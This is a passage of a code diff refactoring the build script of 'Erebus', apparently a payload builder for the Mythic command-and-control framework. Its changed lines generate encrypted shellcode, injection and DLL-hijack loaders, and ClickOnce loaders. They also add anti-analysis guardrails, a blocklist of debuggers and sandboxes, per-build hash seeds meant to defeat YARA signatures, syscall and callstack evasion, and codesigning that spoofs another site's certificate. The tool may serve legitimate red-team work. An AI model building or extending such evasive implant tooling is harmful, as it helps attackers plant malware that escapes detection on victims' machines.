+                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
+                        encryption_key=self.get_parameter("2.2 Encryption Key"),
+                    )
                     shellcode_src = subprocess.check_output(cmd, text=True)
                     output += shellcode_src
-
-                    # Write key to file
-                    start = shellcode_src.find("unsigned char key")
-                    end   = shellcode_src.find("};", start) + 2
-                    key_array = shellcode_src[start:end]
+                    key_array = extract_raw_key_array(shellcode_src)
                     output += key_array
                     with open(encrypted_shellcode_path_sc, "w") as file:
                         file.write(key_array)
@@ -2221,33 +2544,15 @@ generated if none have been entered.""",
                     response.build_message = "Shellcode Generated!"
                     response.build_stdout = output + "\n" + obfuscated_shellcode_path
                     response.updated_filename = "erebus_wrapper.bin"
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1027] - Shellcode Obfuscation",
-                        StepStdout="Obfuscated Shellcode - Continuing to Next Step",
-                        StepSuccess=True,
-                    ))
+                    await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)
                 else:
                     response.status = BuildStatus.Success
                     response.build_message = "Shellcode Generated!"
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1027] - Shellcode Obfuscation",
-                        StepStdout="Obfuscated Shellcode - Continuing to Next Step",
-                        StepSuccess=True,
-                    ))
+                    await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)
 
             elif process.returncode != 0:
                 response.payload = b""
-                await SendMythicRPCPayloadUpdatebuildStep(
-                    MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1027] - Shellcode Obfuscation",
-                    StepStdout="Failed to obfuscate shellcode",
-                    StepSuccess=False,
-                ))
+                await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                 response.build_message = "Failed to obfuscate shellcode."
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
@@ -2255,12 +2560,7 @@ generated if none have been entered.""",
             else:
                 response.payload = b""
                 response.status = BuildStatus.Error
-                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1027] - Shellcode Obfuscation",
-                    StepStdout="Failed to obfuscate shellcode",
-                    StepSuccess=False,
-                ))
+                await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                 response.build_message = "Failed to obfuscate shellcode."
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
@@ -2307,13 +2607,7 @@ generated if none have been entered.""",
                 if not exports or len(exports.strip()) == 0 or os.stat(dll_exports_path).st_size <= 20:
                     response.status = BuildStatus.Error
                     response.build_message = f"Failed to proxy the given file. No exports found or file too small ({os.stat(dll_exports_path).st_size} bytes)."
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1518] - Gathering DLL Exports for Hijacking",
-                        StepStdout=f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.",
-                        StepSuccess=False,
-                    ))
+                    await self._build_step("[T1518] - Gathering DLL Exports for Hijacking", f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.", success=False)
                     return response
 
                 shutil.copy(src=dll_exports_path, dst=loader_exports_path)
@@ -2327,28 +2621,10 @@ generated if none have been entered.""",
 
                 response.status = BuildStatus.Success
                 response.build_message = "DLL Proxied! Compiling Payload..."
-                await SendMythicRPCPayloadUpdatebuildStep(
-                    MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1518] - Gathering DLL Exports for Hijacking",
-                    StepStdout="DLL Proxied! Compiling Payload...",
-                    StepSuccess=True,
-                ))
+                await self._build_step("[T1518] - Gathering DLL Exports for Hijacking", "DLL Proxied! Compiling Payload...", success=True)
 
             elif payload_type == "Loader":
                 loader_type = self.get_parameter("0.1 Loader Type")
-
-                # Parse CSV helper function (used by guardrails in both the
-                # ClickOnce config templating below and the unified loader-
-                # compile section further down). Must be defined before the
-                # ClickOnce branch otherwise Python flags it as an unbound
-                # local inside the enclosing build() method because the later
-                # definition at top-level of build() makes the name local to
-                # the entire method.
-                def parse_csv(value):
-                    if not value or not isinstance(value, str):
-                        return []
-                    return [item.strip() for item in value.split(',') if item.strip()]
 
                 if loader_type == "Shellcode Loader":
                     shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
@@ -2377,41 +2653,47 @@ generated if none have been entered.""",
 
                         # Parse the list-based guardrail parameters and
                         # thread them into config.hpp. These render as
-                        # static const char* arrays inside the generated
-                        # GetGuardrailConfig() function; RunGuardrails()
-                        # then sees populated list pointers and the
-                        # CheckHostname / CheckUsername / CheckDomain /
-                        # CheckIPAddress paths actually fire. Prior to
-                        # this, the lists were rendered to a dead
-                        # guardrail.hpp file that main.cpp never included
-                        # and every list-based guardrail was a no-op.
-                        gr_lists = {
-                            "GUARDRAIL_ALLOWED_HOSTNAMES": parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if guardrails_enabled else [],
-                            "GUARDRAIL_BLOCKED_HOSTNAMES": parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if guardrails_enabled else [],
-                            "GUARDRAIL_BLOCKED_USERNAMES": parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if guardrails_enabled else [],
-                            "GUARDRAIL_ALLOWED_IPS":       parse_csv(self.get_parameter("0.5j IP Whitelist")) if guardrails_enabled else [],
-                            "GUARDRAIL_BLOCKED_IPS":       parse_csv(self.get_parameter("0.5k IP Blacklist")) if guardrails_enabled else [],
-                            "GUARDRAIL_ALLOWED_DOMAINS":   parse_csv(self.get_parameter("0.5l Domain Whitelist")) if guardrails_enabled else [],
-                        }
+                        # XOR-encrypted byte arrays inside the generated
+                        # DecryptGuardrailLists()/GetGuardrailConfig()
+                        # helpers (see collect_guardrail_gr_lists + the
+                        # config.hpp template for the decryption flow).
+                        gr_block = collect_guardrail_gr_lists(
+                            self,
+                            bool(guardrails_enabled),
+                            {
+                                "GUARDRAIL_ALLOWED_HOSTNAMES": "0.5g Hostname Whitelist",
+                                "GUARDRAIL_BLOCKED_HOSTNAMES": "0.5h Block Analysis Hostnames",
+                                "GUARDRAIL_BLOCKED_USERNAMES": "0.5i Block Analysis Usernames",
+                                "GUARDRAIL_ALLOWED_IPS":       "0.5j IP Whitelist",
+                                "GUARDRAIL_BLOCKED_IPS":       "0.5k IP Blacklist",
+                                "GUARDRAIL_ALLOWED_DOMAINS":   "0.5l Domain Whitelist",
+                            },
+                        )
 
-                        config_data = {
-                            "TARGET_PROCESS": target_process,
-                            "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
-                            "COMPRESSION_TYPE": compression_type_value,
-                            "ENCODING_TYPE": encoding_type_value,
-                            "ENCRYPTION_TYPE": encryption_type_value,
-                            "ENCRYPTION_KEY": encryption_key_bytes,
-                            "ENCRYPTION_IV": encryption_iv_bytes,
-                            "GUARDRAILS_ENABLED": guardrails_enabled,
-                            "GUARDRAILS_CHECK_DEBUGGER": guardrails_check_debugger,
-                            "GUARDRAILS_CHECK_REMOTE_DEBUGGER": guardrails_check_remote,
-                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": guardrails_check_processes,
-                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": guardrails_check_hwbp,
-                            "GUARDRAILS_CHECK_TIMING": guardrails_check_timing,
-                            "GUARDRAILS_CHECK_SANDBOX": guardrails_check_sandbox,
-                            "GUARDRAILS_DECOY_FILE": "decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
-                            **gr_lists,
-                        }
+                        # R2b: config_data dict construction lives in
+                        # plugin_loader_config (pure helper). Template
+                        # render + disk write remain here because they're
+                        # bound to the Jinja env + destination path.
+                        config_data = build_loader_config_data(
+                            target_process=target_process,
+                            injection_type=self.get_parameter("0.4 Shellcode Loader - Injection Type"),
+                            compression_type_value=compression_type_value,
+                            encoding_type_value=encoding_type_value,
+                            encryption_type_value=encryption_type_value,
+                            encryption_key_bytes=encryption_key_bytes,
+                            encryption_iv_bytes=encryption_iv_bytes,
+                            guardrails_enabled=guardrails_enabled,
+                            guardrails_check_debugger=guardrails_check_debugger,
+                            guardrails_check_remote_debugger=guardrails_check_remote,
+                            guardrails_check_debugger_processes=guardrails_check_processes,
+                            guardrails_check_hardware_breakpoints=guardrails_check_hwbp,
+                            guardrails_check_timing=guardrails_check_timing,
+                            guardrails_check_sandbox=guardrails_check_sandbox,
+                            guardrails_decoy_file="decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
+                            gr_block=gr_block,
+                            syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
+                            callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
+                        )
                         rendered_config = config_template.render(**config_data)
 
                         # Write the rendered config to the destination
@@ -2420,23 +2702,11 @@ generated if none have been entered.""",
 
                         response.status = BuildStatus.Success
                         response.build_message = "Shellcode Loader config generated!"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1036] - Configuring Shellcode Loader",
-                            StepStdout="Generated config.hpp with user-defined injection parameters",
-                            StepSuccess=True,
-                        ))
+                        await self._build_step("[T1036] - Configuring Shellcode Loader", "Generated config.hpp with user-defined injection parameters", success=True)
                     except Exception as e:
-                        response.status = BuildStatus.Error
-                        response.build_stderr = f"Failed to render Shellcode Loader config: {str(e)}"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1036] - Configuring Shellcode Loader",
-                            StepStdout=f"Failed to render config.hpp: {str(e)}",
-                            StepSuccess=False,
-                        ))
+                        await self._fail_step(response, "[T1036] - Configuring Shellcode Loader",
+                            f"Failed to render Shellcode Loader config: {str(e)}",
+                            f"Failed to render config.hpp: {str(e)}")
                         return response
 
                 elif loader_type == "ClickOnce":
@@ -2493,33 +2763,6 @@ generated if none have been entered.""",
                         compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                         encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
 
-                        # Helper function to convert array to C# string format
-                        def array_to_csharp_string(lst):
-                            if not lst or len(lst) == 0:
-                                return ""
-                            return ", ".join(f'"{item}"' for item in lst)
-
-                        # Default debugger / analysis process blocklist
-                        # rendered into BlockedProcesses. Covers native
-                        # debuggers, .NET decompilers, process monitors,
-                        # and traffic inspectors.
-                        DEFAULT_BLOCKED_PROCESSES = [
-                            # Native debuggers
-                            "x64dbg", "x32dbg", "windbg", "ollydbg", "ida", "ida64",
-                            "immunitydebugger", "radare2",
-                            # .NET decompilers / analysis
-                            "dnspy", "dnspyex", "dotpeek", "ilspy",
-                            "jetbrains.rider", "reflector", "de4dot", "ildasm",
-                            # Process monitors / system inspectors
-                            "processhacker", "procmon", "procmon64", "procexp",
-                            "procexp64", "autoruns", "autorunsc",
-                            # Traffic inspection
-                            "wireshark", "dumpcap", "tcpdump", "fiddler",
-                            "fiddler everywhere", "charles", "burpsuite",
-                            # Sandboxing / analysis harnesses
-                            "sbiectrl", "sandboxiedcomlaunch", "cuckoo",
-                        ]
-
                         # Guardrails configuration for ClickOnce
                         guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                         guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
@@ -2560,32 +2803,14 @@ generated if none have been entered.""",
 
                         response.status = BuildStatus.Success
                         response.build_message = "ClickOnce config generated!"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1204.002] - Configuring ClickOnce Loader",
-                            StepStdout="Generated InjectionConfig.cs with user-defined injection parameters",
-                            StepSuccess=True,
-                        ))
+                        await self._build_step("[T1204.002] - Configuring ClickOnce Loader", "Generated InjectionConfig.cs with user-defined injection parameters", success=True)
                     except Exception as e:
-                        response.status = BuildStatus.Error
-                        response.build_stderr = f"Failed to render ClickOnce config: {str(e)}"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1204.002] - Configuring ClickOnce Loader",
-                            StepStdout=f"Failed to render InjectionConfig.cs: {str(e)}",
-                            StepSuccess=False,
-                        ))
+                        await self._fail_step(response, "[T1204.002] - Configuring ClickOnce Loader",
+                            f"Failed to render ClickOnce config: {str(e)}",
+                            f"Failed to render InjectionConfig.cs: {str(e)}")
                         return response
 
             # ===== Configure & Compile Payload (Unified for all types) =====
-            # Parse CSV helper function (used for guardrails)
-            def parse_csv(value):
-                if not value or not isinstance(value, str):
-                    return []
-                return [item.strip() for item in value.split(',') if item.strip()]
-
             # Configure guadrails if applicable
             if payload_type == "Hijack":
                 guardrail_template = environment.get_template("guardrail.hpp")
@@ -2614,56 +2839,61 @@ generated if none have been entered.""",
                     config_template = environment.get_template("config.hpp")
                     compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                     encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
-                    gr_lists_hijack = {
-                        "GUARDRAIL_ALLOWED_HOSTNAMES": parse_csv(self.get_parameter("1.1f Hostname Whitelist")) if guardrails_enabled else [],
-                        "GUARDRAIL_BLOCKED_HOSTNAMES": parse_csv(self.get_parameter("1.1g Block Analysis Hostnames")) if guardrails_enabled else [],
-                        "GUARDRAIL_BLOCKED_USERNAMES": parse_csv(self.get_parameter("1.1h Block Analysis Usernames")) if guardrails_enabled else [],
-                        "GUARDRAIL_ALLOWED_IPS":       parse_csv(self.get_parameter("1.1i IP Whitelist")) if guardrails_enabled else [],
-                        "GUARDRAIL_BLOCKED_IPS":       parse_csv(self.get_parameter("1.1j IP Blacklist")) if guardrails_enabled else [],
-                        "GUARDRAIL_ALLOWED_DOMAINS":   parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
-                    }
-                    config_data = {
-                        "TARGET_PROCESS": "",
-                        "INJECTION_TYPE": 2,  # CreateFiber (self-injection) - DLL runs in the hijacked process
-                        "COMPRESSION_TYPE": compression_type_value,
-                        "ENCODING_TYPE": encoding_type_value,
-                        "ENCRYPTION_TYPE": encryption_type_value,
-                        "ENCRYPTION_KEY": encryption_key_bytes,
-                        "ENCRYPTION_IV": encryption_iv_bytes,
-                        "GUARDRAILS_ENABLED": 1 if guardrails_enabled else 0,
-                        "GUARDRAILS_CHECK_DEBUGGER": 1 if self.get_parameter("1.1a Check IsDebuggerPresent") and guardrails_enabled else 0,
-                        "GUARDRAILS_CHECK_REMOTE_DEBUGGER": 1 if self.get_parameter("1.1b Check Remote Debugger") and guardrails_enabled else 0,
-                        "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": 1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
-                        "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": 1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
-                        "GUARDRAILS_CHECK_TIMING": 1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
-                        "GUARDRAILS_CHECK_SANDBOX": 0,
-                        "GUARDRAILS_DECOY_FILE": "",
-                        **gr_lists_hijack,
-                    }
+                    gr_block_hijack = collect_guardrail_gr_lists(
+                        self,
+                        bool(guardrails_enabled),
+                        {
+                            "GUARDRAIL_ALLOWED_HOSTNAMES": "1.1f Hostname Whitelist",
+                            "GUARDRAIL_BLOCKED_HOSTNAMES": "1.1g Block Analysis Hostnames",
+                            "GUARDRAIL_BLOCKED_USERNAMES": "1.1h Block Analysis Usernames",
+                            "GUARDRAIL_ALLOWED_IPS":       "1.1i IP Whitelist",
+                            "GUARDRAIL_BLOCKED_IPS":       "1.1j IP Blacklist",
+                            "GUARDRAIL_ALLOWED_DOMAINS":   "1.1k Domain Whitelist",
+                        },
+                    )
+                    # R2b: shared config_data builder. Hijack hardcodes
+                    # INJECTION_TYPE=2 (CreateFiber) because the DLL
+                    # already runs in the hijacked process, and uses the
+                    # 1.1* parameter namespace for guardrail toggles.
+                    config_data = build_loader_config_data(
+                        target_process="",
+                        injection_type=2,
+                        compression_type_value=compression_type_value,
+                        encoding_type_value=encoding_type_value,
+                        encryption_type_value=encryption_type_value,
+                        encryption_key_bytes=encryption_key_bytes,
+                        encryption_iv_bytes=encryption_iv_bytes,
+                        guardrails_enabled=1 if guardrails_enabled else 0,
+                        guardrails_check_debugger=1 if self.get_parameter("1.1a Check IsDebuggerPresent") and guardrails_enabled else 0,
+                        guardrails_check_remote_debugger=1 if self.get_parameter("1.1b Check Remote Debugger") and guardrails_enabled else 0,
+                        guardrails_check_debugger_processes=1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
+                        guardrails_check_hardware_breakpoints=1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
+                        guardrails_check_timing=1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
+                        guardrails_check_sandbox=0,
+                        guardrails_decoy_file="",
+                        gr_block=gr_block_hijack,
+                        syscall_backend=(1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0),
+                        callstack_spoof_enabled=(1 if self.get_parameter("0.5n Callstack Spoofing") else 0),
+                    )
                     rendered_config = config_template.render(**config_data)
                     config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
                     with open(config_hpp_destination, "w") as config_file:
                         config_file.write(rendered_config)
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1036] - Configuring DLL Hijack Loader",
-                        StepStdout="Generated config.hpp with encryption/compression settings",
-                        StepSuccess=True,
-                    ))
+                    await self._build_step("[T1036] - Configuring DLL Hijack Loader", "Generated config.hpp with encryption/compression settings", success=True)
                 except Exception as e:
-                    response.status = BuildStatus.Error
-                    response.build_stderr = f"Failed to render Hijack config: {str(e)}"
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1036] - Configuring DLL Hijack Loader",
-                        StepStdout=f"Failed to render config.hpp: {str(e)}",
-                        StepSuccess=False,
-                    ))
+                    await self._fail_step(response, "[T1036] - Configuring DLL Hijack Loader",
+                        f"Failed to render Hijack config: {str(e)}",
+                        f"Failed to render config.hpp: {str(e)}")
                     return response
 
-                # DLL Hijack compilation
+                # DLL Hijack compilation.
+                # EREBUS_HASH_SEED is a per-build random 32-bit constant that
+                # reseeds the compile-time API hash function, so every built
+                # loader has unique hash values for GetProcAddress targets.
+                # Defeats family-level YARA pinned on fixed hash constants.
+                _hash_seed = f"0x{secrets.randbits(32):08X}"
+                _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                 cmd = [
                     "make",
                     "-C",
@@ -2671,6 +2901,9 @@ generated if none have been entered.""",
                     f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
                     f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                     "TARGET=dll",
+                    f"EREBUS_HASH_SEED={_hash_seed}",
+                    f"CONFIG_SYSCALL_BACKEND={_sw3}",
+                    f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
                     "all"
                 ]
                 compile_step_name = "[T1027.011] - Compiling DLL Payload"
@@ -2721,6 +2954,9 @@ generated if none have been entered.""",
                         payload_final_name = "test_payloads.zip"
                     else:
                         loader_format = self.get_parameter('0.2 Loader Format')
+                        _hash_seed = f"0x{secrets.randbits(32):08X}"
+                        _sw3 = 1 if self.get_parameter("0.5m Syscall Backend") == "SysWhispers3" else 0
+                        _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
                         cmd = [
                             "make",
                             "-C",
@@ -2728,6 +2964,9 @@ generated if none have been entered.""",
                             f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
                             f"TARGET={loader_format}",
                             f"BUILD={build_config}",
+                            f"EREBUS_HASH_SEED={_hash_seed}",
+                            f"CONFIG_SYSCALL_BACKEND={_sw3}",
+                            f"CONFIG_CALLSTACK_SPOOF_ENABLED={_cs}",
                             "all"
                         ]
                         if loader_format == "dll":
@@ -2782,29 +3021,26 @@ generated if none have been entered.""",
                 payload_path = str(payload_path)
                 shutil.copy(dst=payload_path, src=payload_output_file)
 
+                # Skip PE sanitize + self-hunt on debug builds - see
+                # _finalize_pe_artifact for the rationale.
+                _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
+                output += _finalize_pe_artifact(
+                    payload_path,
+                    str(PurePath(agent_build_path) / "payload"),
+                    build_config=_hijack_build_config,
+                )
+
                 if os.path.exists(payload_path):
                     response.status = BuildStatus.Success
                     response.build_message = "DLL Compiled!"
                     response.build_stdout = output + "\n" + payload_path
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName=compile_step_name,
-                        StepStdout=compile_step_msg,
-                        StepSuccess=True,
-                    ))
+                    await self._build_step(compile_step_name, compile_step_msg, success=True)
                 else:
                     response.status = BuildStatus.Error
                     response.payload = b""
                     response.build_message = "Failed to compile DLL"
                     response.build_stderr = output + "\n" + payload_path
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName=compile_step_name,
-                        StepStdout="Failed to Compile DLL Payload",
-                        StepSuccess=False,
-                    ))
+                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
                     return response
 
             elif payload_type == "Loader":
@@ -2828,13 +3064,7 @@ generated if none have been entered.""",
                             response.status = BuildStatus.Error
                             response.build_message = "Failed to compile test payloads"
                             response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
-                            await SendMythicRPCPayloadUpdatebuildStep(
-                                MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName=compile_step_name,
-                                StepStdout="Failed to Compile Test Payloads",
-                                StepSuccess=False,
-                            ))
+                            await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
                             return response
 
                         # Create agent_code/payloads directory for persistent storage
@@ -2876,13 +3106,7 @@ generated if none have been entered.""",
                             response.status = BuildStatus.Success
                             response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
                             response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
-                            await SendMythicRPCPayloadUpdatebuildStep(
-                                MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName=compile_step_name,
-                                StepStdout=f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}",
-                                StepSuccess=True,
-                            ))
+                            await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)
 
                             # For test builds, read the zip and return it as the payload
                             with open(final_zip_path, "rb") as f:
@@ -2895,41 +3119,33 @@ generated if none have been entered.""",
                             response.status = BuildStatus.Error
                             response.build_message = f"Failed to create test payload zip"
                             response.build_stderr = output + "\n" + str(final_zip_path)
-                            await SendMythicRPCPayloadUpdatebuildStep(
-                                MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName=compile_step_name,
-                                StepStdout=f"Failed to package test payloads",
-                                StepSuccess=False,
-                            ))
+                            await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
                             return response
                     else:
                         payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                         payload_path = str(payload_path)
                         shutil.copy(dst=payload_path, src=payload_output_file)
 
+                        # build_config was resolved at the top of this
+                        # branch (Shellcode Loader, non-test). Threaded
+                        # into the finalizer so debug builds skip the
+                        # sanitizer/self_hunt pair.
+                        output += _finalize_pe_artifact(
+                            payload_path,
+                            str(PurePath(agent_build_path) / "payload"),
+                            build_config=build_config,
+                        )
+
                         if os.path.exists(payload_path):
                             response.status = BuildStatus.Success
                             response.build_message = "Loader Compiled!"
                             response.build_stdout = output + "\n" + payload_path
-                            await SendMythicRPCPayloadUpdatebuildStep(
-                                MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName=compile_step_name,
-                                StepStdout=compile_step_msg,
-                                StepSuccess=True,
-                            ))
+                            await self._build_step(compile_step_name, compile_step_msg, success=True)
                         else:
                             response.status = BuildStatus.Error
                             response.build_message = "Failed to compile loader"
                             response.build_stderr = output + "\n" + payload_path
-                            await SendMythicRPCPayloadUpdatebuildStep(
-                                MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName=compile_step_name,
-                                StepStdout="Failed to Compile Shellcode Loader",
-                                StepSuccess=False,
-                            ))
+                            await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
                             return response
 
                 elif loader_type == "ClickOnce":
@@ -2937,13 +3153,7 @@ generated if none have been entered.""",
                         response.status = BuildStatus.Error
                         response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
                         response.build_stderr = output
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName=compile_step_name,
-                            StepStdout=f"Makefile publish failed",
-                            StepSuccess=False,
-                        ))
+                        await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
                         return response
 
                     # Locate publish output
@@ -2967,13 +3177,7 @@ generated if none have been entered.""",
                         response.status = BuildStatus.Error
                         response.build_message = "Failed to locate ClickOnce publish output directory"
                         response.build_stderr = output + f"\nSearched in: {publish_root}"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName=compile_step_name,
-                            StepStdout="Failed to locate ClickOnce publish output",
-                            StepSuccess=False,
-                        ))
+                        await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
                         return response
 
                     # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
@@ -3013,112 +3217,20 @@ generated if none have been entered.""",
                         response.status = BuildStatus.Error
                         response.build_message = "Failed to locate compiled ClickOnce executable"
                         response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName=compile_step_name,
-                            StepStdout="Failed to locate executable",
-                            StepSuccess=False,
-                        ))
+                        await self._build_step(compile_step_name, "Failed to locate executable", success=False)
                         return response
 
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName=compile_step_name,
-                        StepStdout=compile_step_msg,
-                        StepSuccess=True,
-                    ))
+                    await self._build_step(compile_step_name, compile_step_msg, success=True)
 
             output = ""
             ######################### End Of Payload Build Section #########################
             ######################### Code Signing Section #########################
-            if self.get_parameter("6.0 Codesign Loader"):
-                try:
-                    if self.get_parameter("0.0 Main Payload Type") == "Loader":
-                        payload_path = Path(agent_build_path) / "payload" / f"erebus.{self.get_parameter('0.2 Loader Format')}"
-                    elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
-                        payload_path = Path(agent_build_path) / "payload" / dll_file_name
-                    elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
-                        payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
-                    else:
-                        raise ValueError("Unsupported payload type for code signing")
-
-                    if not payload_path.exists():
-                        raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")
-
-                    signing_type = self.get_parameter("6.1 Codesign Type")
-                    success_msg = ""
-
-                    if signing_type == "SelfSign":
-                        cn = self.get_parameter("6.2 Codesign CN")
-                        org = self.get_parameter("6.3 Codesign Orgname") or cn
-
-                        self_sign_payload(
-                            payload_path=payload_path,
-                            subject_cn=cn,
-                            org_name=org
-                        )
-                        success_msg = f"Self-signed with CN: {cn}"
-
-                    elif signing_type == "Spoof URL":
-                        target_url = self.get_parameter("6.4 Codesign Spoof URL")
-                        if not target_url:
-                            raise ValueError("No URL provided for spoofing")
-
-                        cert_details = get_remote_cert_details(target_url)
-                        self_sign_payload(
-                            payload_path=payload_path,
-                            subject_cn=cert_details["CN"],
-                            org_name=cert_details["O"],
-                            full_details=cert_details
-                        )
-                        success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"
-
-                    elif signing_type == "Provide Certificate":
-                        cert_uuid = self.get_parameter("6.5 Codesign Cert")
-                        cert_pass = self.get_parameter("6.6 Codesign Cert Password")
-
-                        if not cert_uuid:
-                            raise ValueError("No certificate file uploaded")
-
-                        file_resp = await SendMythicRPCFileGetContent(
-                            MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
